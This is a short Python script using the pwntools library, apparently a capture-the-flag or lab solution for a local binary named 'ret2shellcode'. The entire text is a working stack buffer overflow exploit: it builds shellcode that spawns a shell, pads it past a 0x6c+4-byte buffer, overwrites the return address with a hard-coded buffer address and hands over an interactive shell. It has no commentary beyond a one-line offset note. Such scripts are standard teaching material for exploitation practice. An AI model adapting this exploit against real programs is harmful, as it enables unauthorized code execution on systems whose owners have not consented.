from pwn import *
sh = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080
sh.sendline(shellcode.ljust(0x6c+4,b"a")+p32(buf2_addr))
# 108+4
sh.interactive()